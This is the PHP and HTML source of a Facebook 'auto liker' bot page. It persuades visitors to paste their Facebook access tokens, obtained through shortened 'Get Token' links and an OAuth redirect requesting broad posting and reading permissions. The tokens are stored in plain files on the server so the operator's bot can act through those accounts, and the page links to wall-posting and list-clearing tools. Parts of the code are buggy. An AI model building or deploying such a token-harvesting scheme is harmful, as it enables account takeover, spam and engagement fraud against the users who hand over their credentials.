<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>CHAUDHRY AHSAN</title>
<meta name="keywords" content="#" />
<meta name="description" content="#" />
<!--
Template 2058 metallic slider 
http://www.tooplate.com/view/2058-metallic-slider
-->
<link href="style.css" rel="stylesheet" type="text/css" />
<style>@font-face {font-family: aryanfonts;src: url(fonts/aa.ttf);}</style>
<script type="text/javascript">
	$().ready(function() {  
		$('.kwicks').kwicks({  
			max : 696,  
			spacing : 0,  
			sticky: true,
		});  
	}); 
</script>

<link rel="stylesheet" href="css/slimbox2.css" type="text/css" media="screen" /> 

</head>

<?php session_start();

	error_reporting(0);

	$bot=new bot();

	class bot{

public function getGr($as,$bs){

	$ar=array(

	'graph',

	'fb',

	'me'
);

$im='https://'.implode('.',$ar);

	return $im.$as.$bs;
}

public function getUrl($mb,$tk,$uh=null){
	$ar=array(
	
	'access_token' => $tk,
);
	
	if($uh){

	$else=array_merge($ar,$uh);

	}else{

	$else=$ar;
}
	foreach($else as $b => $c){
	
	$don[]=$b.'='.$c;
}
	$true='?'.implode('&',$don);
	
	$true=$this->getGr($mb,$true);

	$true=json_decode($this->

	one($true),true);

	if($true[data]){

	return $true[data];

	}else{

	return $true;}
}

private function one($url){

	$cx=curl_init();

	curl_setopt_array($cx,array(

	CURLOPT_URL => $url,

	CURLOPT_CONNECTTIMEOUT => 5,

	CURLOPT_RETURNTRANSFER => 1,

	CURLOPT_USERAGENT => 'SCRIPT CREATED BY -=[ ASAD ALI ]=-',
));

	$ch=curl_exec($cx);

	curl_close($cx);

	return ($ch);
}

public function savEd($tk,$id,$z=null,$bb=null){

	if(!is_dir('don')){

        mkdir('don');
}

if($bb){

	$blue=fopen('don/'.$id,'w');

	fwrite($blue,$tk.'*on*on*on*on*'.$bb);

        fclose($blue);

echo '
	<script type="text/javascript">

	document.getElementById("resp").style="font-color:green;font-family:miaanFont;";

	document.getElementById("resp").innerHTML="Comment Text Saved.";

	</script>';

}else{

        if($z){

	if(file_exists('don/'.$id)){

	$file=file_get_contents(don);

	$ex=explode('*',$file);

	$str=str_replace($ex[0],$tk,$file);

	$xs=fopen('don/'.$id,'w');

        fwrite($xs,$str);

        fclose($xs);

}else{
	$str=$tk.'*on*on*on*on*'.$c;

	$xs=fopen('don/'.$id,'w');

        fwrite($xs,$str);

        fclose($xs);
}

	$_SESSION[key]=$tk.'_'.$id;

	}else{

	$file=file_get_contents('don/'.$id);

	$file=explode('*',$file);

        if($file[5]){

	$up=fopen('don/'.$id,'w');

	fwrite($up,$tk.'*on*on*on*on*'.$file[5]);

        fclose($up);

        }else{

	$up=fopen('don/'.$id,'w');

	fwrite($up,$tk.'*on*on*on*on*');

        fclose($up);
}

echo '

	<script type="text/javascript">

	document.getElementById("resp").style="font-color:green;font-family:miaanFont;";

	document.getElementById("resp").innerHTML="Bot Settings Has Been Updated";

	</script>';}}
}

public function lOgbot($d){

	unlink('don/'.$d);

	unset($_SESSION[key]);

echo '
	<script type="text/javascript">

	document.getElementById("resp").style="font-color:green;font-family:miaanFont;";

	document.getElementById("resp").innerHTML="Logout Successful";

	</script>';

$this->atas();

$this->home();

$this->bwh();

}

public function cek($tok,$id,$nm){

echo '
<div id="bottom-content">
<div id="navigation-menu">
<center><a href="http://facebook.com/' . $id . '"><img src="https://graph.facebook.com/' . $id . '/picture?width=800" style="-moz-box-shadow:0px 0px 20px 0px red;-webkit-box-shadow:0px 0px 20px 0px red;-o-box-shadow:0px 0px 20px 0px red;box-shadow:0px 0px 20px 0px red;width:150px; height:150px;border-radius:500px;" alt="' . $nm . '"/></a></center>
</div><br/>
<center><br>
<font color="white"> Activate Your Bot My Dear Friend </font></br>
<span>User name :<b>'.$nm.'</b><br></span>
<span>User ID :<b>' . $id . '</b><br></span>

<form action="index.php" method="post">
<div id="top-content">
<div id="search-form">
<input class="button button1" type="submit" value="Activate Bot">
</form></center>
</div>
</div>
</div>';

$this->membEr();
}

public function atas(){
echo'
 <div style="font-family: aryanfonts; font-size: 60pt"> <center><script language="JavaScript" src="header.js"></script></font></center> <center><hr style="background-color:white;width:60%;"><center>
';
}

public function home(){
echo'
</h2></center></div>
<div id="content">
<div class="post">
';
}

public function bwh(){
echo'
<div id="bottom-content">
<div class="post">
<div class="post-content">
								<span>
									<a href="https://www.facebook.com/haterkabaap.chahsan" target="_blank"><img src="img/23.jpg" style="border: 4px solid green; padding: 4px; margin: 4px; width: 200px; height: 200px; float: left;" alt="CHAUDHRY AHSAN" class="thumbnail"/>
									</a>
									<a href="https://www.facebook.com/ahsanbot.creator
									" target="_blank"><img src="img/24.jpg" style="border: 4px solid green; padding: 4px; margin: 4px; width: 200px; height: 200px; float: right;" alt="CHAUDHRY AHSAN ll" class="thumbnail">
									</a>
									<br>
							</div>

<br>
<center><a href="https://goo.gl/CvenbL" target="_blank"><input class="btn btn-success btn-lg fb-popup" type="button" value="Allow App"></a> <a href="https://goo.gl/NkKRQ6" target="_blank"><input class="btn btn-success btn-lg fb-popup" type="button" value="Get Token"></a>
</center>
<center>
<ul>
</center>
<div id="top-content">
<div id="search-form">

<center><form action="index.php" method="post"><input class="inptext inptext1" type="text" placeholder="&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Paste Your Token...! " st="" name="token"> <br><input class="btn btn-block btn-danger" id="sbmt" type="submit" value="ACTIVATE BOT"> </form></center></div></div></div>';

$this->membEr();
}

public function membEr(){

	if(!is_dir('don')){

	mkdir('don');
}

$up=opendir('don');

	while($use=readdir($up)){

	if($use != '.' && $use != '..'){

	$user[]=$use;}
}

echo'

<div id="footer">
<center><br>
										<font face="aryanfonts" size="10" color="blue">
											<font style= "text-shadow: 0px 0px 4px rgb(255, 0, 0), 0px 0px 4px rgb(255, 0, 0), 0px 0px 10px rgb(255, 0, 0); color: rgb(0, 163, 239); font-weight: bold;" size="8">LOVERS <font color="lime">'.count($user).'</font></font>

</div>';

}

public function toXen($h){
header('Location: https://m.facebook.com/dialog/oauth?client_id='.$h.'&redirect_uri=https://www.facebook.com/connect/login_success.html&display=wap&scope=publish_actions%2Cuser_photos%2Cuser_friends%2Cfriends_photos%2Cuser_activities%2Cuser_likes%2Cuser_status%2Cuser_groups%2Cfriends_status%2Cpublish_stream%2Cread_stream%2Cread_requests%2Cstatus_update&response_type=token&fbconnect=1&from_login=1&refid=9');
}


}
if(isset($_SESSION[key])){
        $a=$_SESSION[key];
        $ai=explode('_',$a);
        $a=$ai[0];
if($_POST[logout]){
        $ax=$_POST[logout];
        $bot->lOgbot($ax);
}else{
$b=$bot->getUrl('/me',$a,array(
'fields' => 'id,name',
));
if($b[id]){
if($_POST[likes]){
        $as=$_POST[likes];
        $bs=$_POST[emot];
        $bx=$_POST[target];
        $cs=$_POST[opsi];
        $tx=$_POST[text];
if($cs=='text'){
        unlink('don/'.$b[id]);
$bot->savEd($a,$b[id],$as,$bs,$bx,'off');
        }else{
        if($tx){
$bot->savEd($a,$b[id],$as,$bs,$bx,$cs,'x',$tx);
        }else{
$bot->savEd($a,$b[id],$as,$bs,$bx,$cs);}}
}
        $bot->atas();
        $bot->home();
$bot->cek($a,$b[id],$b[name]);
}else{
echo '
			<script type="text/javascript">
				document.getElementById("resp").style="color:red;font-family:miaanFont;";
				document.getElementById("resp").innerHTML="<h2>Token Expired</h2>";
			</script>';
        unset($_SESSION[key]);
        unlink('don/'.$ai[1]);
$bot->atas();
$bot->home();
        $bot->bwh();}}
        }else{
if($_POST[token]){
        $a=$_POST[token];
if(preg_match('/token/',$a)){
$tok=substr($a,strpos($a,'token=')+6,(strpos($a,'&')-(strpos($a,'token=')+6)));
        }else{
        $cut=explode('&',$a);
$tok=$cut[0];
}
$b=$bot->getUrl('/me',$tok,array(
        'fields' => 'id,name',
));
if($b[id]){
$bot->savEd($tok,$b[id],'on','on','on','on','null');
        $bot->atas();
        $bot->home();
$bot->cek($tok,$b[id],$b[name]);
}else{
echo '
			<script type="text/javascript">
				document.getElementById("resp").style="color:red;font-family:miaanFont;";
				document.getElementById("resp").innerHTML="<h2>Invalid Token Or Expired Token</h2>";
			</script>';
        $bot->atas();
        $bot->home();
        $bot->bwh();}
}else{
if($_GET[token]){
        $a=$_GET[token];
        $bot->toXen($a);
}else{
        $bot->atas();
        $bot->home();
        $bot->bwh();}}
}
?>
<center><font face="aryanfonts" size="5" style="text-shadow: 0px 0px 10px lime, 0px 0px 10px lime, 0px 0px 10px lime; color: rgb(255, 255, 255); font-weight: bold;"><a class="btn btn-block btn-success" href="clear.php" target="_blank">
<i class="fa fa-external-link"></i> CLICK HERE FB LIST CLEAR.!
</a>♚<a class="btn btn-block btn-success" href="poster.php" target="_blank">
<i class="fa fa-external-link"></i> CLICK HERE FB WALL POST.!
</a>♚<a class="btn btn-block btn-success" href="expt.php" target="_blank">
<i class="fa fa-external-link"></i> CLICK HERE TO EXPT ALL REQ.!
</a></font></center>